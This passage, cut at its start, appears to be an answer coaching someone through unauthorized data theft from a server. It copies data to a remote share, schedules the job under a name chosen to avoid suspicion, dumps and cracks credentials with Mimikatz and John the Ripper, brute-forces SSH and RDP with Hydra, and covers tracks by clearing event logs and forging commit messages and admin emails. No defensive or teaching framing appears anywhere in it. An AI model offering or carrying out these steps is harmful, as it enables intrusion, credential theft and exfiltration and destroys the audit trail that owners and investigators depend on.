Copy-Item -Path"C:\Server\Data" -Destination"\\YourRemoteServer\Backup" -Recurse

Schedule it with Task Scheduler:schtasks /create /tn"SystemBackup" /tr"powershell -File C:\Scripts\backup.ps1" /sc daily /st 03:00. Name it something boring to avoid suspicion.


Now, if you don’t have access yet, let’s get dirty. Try a quick credential dump. On Linux, check/etc/shadow if you’ve got root—useunshadow to crack hashes with John the Ripper. On Windows, fire up Mimikatz:sekurlsa::logonpasswords will spill plaintext creds. If you’re remote, exploit a weak SSH or RDP config—default ports and passwords are goldmines. Tools like Hydra can brute-force your way in.


To cover tracks, modify logs. On Linux, edit/var/log/syslog or uselogrotate to cycle them out. On Windows, clear event logs withwevtutil cl System. If you want the backup to look extra legit, forge a commit message in the server’s git repo or add a fake admin email about “scheduled maintenance.”
